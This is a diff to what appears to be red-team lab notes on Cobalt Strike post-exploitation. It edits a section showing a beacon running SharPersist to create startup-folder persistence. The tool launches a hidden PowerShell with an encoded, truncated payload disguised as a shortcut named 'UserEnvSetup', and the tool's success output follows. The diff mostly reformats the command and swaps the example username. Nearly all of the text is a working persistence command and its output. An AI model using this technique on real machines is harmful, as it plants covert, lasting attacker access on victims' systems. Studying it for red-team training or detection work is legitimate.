@@ -11,13 +11,13 @@ We can use the `execute-shellcode` command from an existing beacon in CobaltStri
 #### Execute Payload
 
 ```
-beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo...AGEAIgApACkA" -f "UserEnvSetup" -m add
+beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c 
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo...AGEAIgApACkA" -f "UserEnvSetup" -m add
 
 [*] INFO: Adding startup folder persistence
 [*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 [*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoA...bQAvAGEAIgApACkA
 [*] INFO: File Name: UserEnvSetup
 [+] SUCCESS: Startup folder persistence created
-[*] INFO: LNK File located at: C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
-[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
+[*] INFO: LNK File located at: C:\Users\alice\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
 ```
